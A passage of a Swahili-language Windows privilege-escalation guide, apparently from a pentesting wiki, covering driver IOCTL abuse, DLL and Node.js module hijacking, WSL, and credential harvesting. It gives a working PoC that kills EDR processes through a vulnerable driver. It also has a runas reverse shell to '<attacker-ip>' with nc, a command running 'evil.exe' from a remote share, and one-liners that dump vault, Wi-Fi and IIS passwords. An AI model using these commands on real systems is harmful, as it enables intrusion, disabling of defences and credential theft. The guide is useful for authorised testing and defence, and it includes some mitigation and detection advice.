- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode hutegemea `EntryContext` kuelekeza kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack kisha kutumia tena buffer hiyo hiyo kusoma string, mshambuliaji hudhibiti `Length`/`MaximumLength` na huathiri kwa kiasi pointer ya `Buffer`, hivyo kusababisha kernel write inayodhibitiwa kwa kiasi.
- **`REG_BINARY`**: kwa binary data kubwa, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambuliaji kwenye scalar inayotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambuliaji moja kwa moja juu ya nafasi za stack zilizo karibu, jambo ambalo mara nyingi ndiyo njia safi zaidi ya kufuta callback-pointer yote.

Muundo muhimu wa kutafuta: **usomaji wa registry wa aina tofauti ndani ya stack variable ileile bila kuianzisha upya**. Tafuta kwa grep `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambapo usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia vibaya kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party driver zilizosainiwa huunda device object zao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL hailazimishwi kifaa kinapofunguliwa kupitia path yenye sehemu ya ziada, hivyo mtumiaji yeyote asiye na privilege anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji anapoweza kufungua kifaa, privileged IOCTLs zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na udukuzi. Uwezo uliobainika katika matukio halisi:
- Kurejesha handles zenye full-access kwa processes zozote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write isiyo na vizuizi (udukuzi wa offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, zikiwemo Protected Process/Light (PP/PPL), na kuruhusu kuua AV/EDR kutoka user land kupitia kernel.

Muundo wa PoC wa chini kabisa (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu termination ya process au kurudisha handles.
- Dhibiti IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie models zinazotumia broker badala ya privileges za kernel za moja kwa moja.

Mawazo ya detection kwa defenders
- Fuatilia opens kutoka user-mode za majina ya device yanayotiliwa shaka (k.m., \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza vulnerable driver blocklist ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder iliyo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na process na **kuongeza privileges**.<sup>[[2]](#references)</sup>

Angalia permissions za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapofanya bare import kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` kwenye kila saraka mama. Kwenye Windows, utafutaji huo unaweza kufika kwenye root ya drive, kwa hiyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta kwenye:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye haki ndogo** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye haki za juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hiyo hii huwa **LPE** wakati wowote target inapoendeshwa kama administrator, kupitia scheduled task/service wrapper iliyoinuliwa, au kupitia desktop app ya upendeleo wa juu inayoanzishwa kiotomatiki.

Hali hii ni ya kawaida hasa wakati:

- dependency imetangazwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya wahusika wengine inaweka `require("foo")` ndani ya `try/catch` na kuendelea inaposhindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye code kuu ya programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable ya target (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Miundo ya code-review inayofaa kutafutwa kwenye faili za `.asar` zilizofunguliwa au source za programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina kamili linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha programu ya mwathiriwa. Ikiwa programu itajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya ulimwengu halisi ya moduli za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye privileges za juu utaweza kutatua.

### Mawazo ya ugunduzi na uimarishaji wa usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/paketi mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kubaini mifumo ya `try { require("...") } catch {}` inayotekelezwa bila kutoa taarifa.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili ya hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Miingiliano ya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Bandari Wazi

Angalia **huduma zilizowekewa vikwazo** kutoka nje.

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa authentication na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa na akaunti yenye mapendeleo ya juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni viashiria vya awali tu, ilhali njia ya authenticated memory-corruption inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kufikiwa nayo. Ikiwa port iliyo wazi inaonekana kuwa ya system process, linganisha na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubaini huduma ya backend; forwarding rule pekee haithibitishi kuwa destination inaweza kufikiwa au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Amri zaidi za network enumeration [hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kuona amri ambazo huenda zilirekodi sifa za kuingia; kupandisha kiwango cha haki bado kunahitaji akaunti halali yenye haki za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` hutumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hivyo tambua kwanza distro halisi na njia yake ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uorodheshaji otomatiki.

## Sifa za Windows

### Sifa za Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni finding ya registry yenye password ya plaintext. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, huo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauonyeshi kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credential.

### Credentials manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya servers, tovuti, na programu nyingine ambazo **Windows** inaweza kutumia **kuingia kwa watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter, au Gmail na kuingia kiotomatiki kupitia browsers, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki, kumaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (server au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila wakati.

Isipokuwa programu hizo ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya remote kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa kutumia seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa unaweza kutumia mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au moduli ya Powershell ya [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonyeshwa pia kama `Web Credentials` katika `vaultcmd`). Nafasi hii ya hifadhi hutenganishwa kwa kila kipindi na inaweza kusimbuliwa kwa njia asilia bila haki za msimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya kipindi amilifu cha mtumiaji ili kutupa na kusimbua papo hapo majina yote ya watumiaji na nywila zote za maandishi wazi zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche linganifu wa data, ambayo hutumiwa zaidi ndani ya mfumo wa uendeshaji wa Windows kusimba kwa njia linganifu funguo za faragha zisizolingana. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa fiche kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, unaohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili hiyohiyo**, kwa kawaida huwa na data nasibu ya baiti 64. (Ni muhimu kukumbuka kuwa ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

**Faili za credentials zinazolindwa na nenosiri kuu** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kufanya decryption.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Sifa za kuingia za PowerShell

**Sifa za kuingia za PowerShell** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia rahisi ya kuhifadhi sifa za kuingia zilizosimbwa kwa njia fiche. Sifa hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba zinaweza kufumbuliwa tu na mtumiaji yuleyule kwenye kompyuta ileile ambako ziliundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Script au orodha ya faili inapokuelekeza kwenye mojawapo, tafuta saraka halisi ya akaunti badala ya kudhani kuwa iko kwenye `C:\Users`: [Windows inaweza kuweka profaili mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufunga credential iliyosimbwa kwa njia fiche kwa mtumiaji na kompyuta iliyoihamisha](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye huduma inayolengwa. Kagua njia na ACL kwanza, bila kuchapisha thamani zilizosimbwa kwa njia fiche au zilizo katika maandishi wazi wakati wa kuorodhesha kwa kawaida.

Ili **kufumbua** credentials za PS kutoka kwenye faili inayozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata katika `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Eneo-kazi la Mbali**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kama kidokezo cha credentials. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na kama master password maalum ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Exports za profile za Remote Desktop Plus** zinaweza pia kusomeka kwenye saraka za mtumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina maingizo ya `Data/Profile` yenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani kuwa kiko katika maandishi ya kawaida: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kufungamanishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa kwa ukali mdogo. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Mara nyingi watu hutumia programu ya Sticky Notes kwenye vituo vya kazi vya Windows **kuhifadhi passwords** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila wakati.

Wakati mwingine watu huhifadhi passwords na taarifa nyingine kwenye programu za dokezo nata. Programu ya Microsoft Sticky Notes iliyosakinishwa kama kifurushi kwa kawaida huhifadhi dokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kuwa hakuna dokezo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kuacha nje dokezo za hivi karibuni zilizothibitishwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au password ni kidokezo cha credentials tu: thibitisha akaunti, ruhusa ya ufikiaji na matumizi ya password hiyo kwenye akaunti nyingine kando. Rekodi iliyosimbwa ya password manager pia huhitaji ufunguo wake halisi wa kusimbua na ufafanuzi maalum wa programu kabla ya kuthibitisha login yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha passwords kutoka AppCmd.exe, unahitaji kuwa Administrator na uendeshe kwa kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, basi kuna uwezekano kuwa baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishaji **huendeshwa kwa SYSTEM privileges**, vingi vinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Vitambulisho)

### Mabaki ya vitambulisho kwenye registry ya zana za usaidizi

Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na nywila chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya kipindi iliyosanidiwa katika matoleo kabla ya 9, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la thamani ni kidokezo cha kuchunguza tu: thibitisha toleo lililosakinishwa, data ya thamani inayoweza kusomeka, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini hicho kitambulisho. Kuhama kutoka nywila ya usaidizi wa mbali hadi akaunti ya Windows yenye ruhusa zaidi kunahitaji pia matumizi halisi ya nywila hiyo tena na idhini ya kutumia akaunti hiyo. Usijumuishe maandishi yaliyosimbwa fiche na nywila zilizorejeshwa kwenye matokeo ya kawaida ya uhesabuji.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku kuwa kitabu cha kazi kinachoweza kusomeka na kushirikiwa kina data za akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa laha-kazi au safu wima zilizofichwa. [Microsoft inaeleza](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa laha-kazi hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya kitabu cha kazi yamesimbwa fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na uepuke kuchapisha siri zinazoweza kuwepo wakati wa uhesabuji mpana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa peke yake haithibitishi kuwa vitambulisho vipo au akaunti yoyote ina ruhusa za juu zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

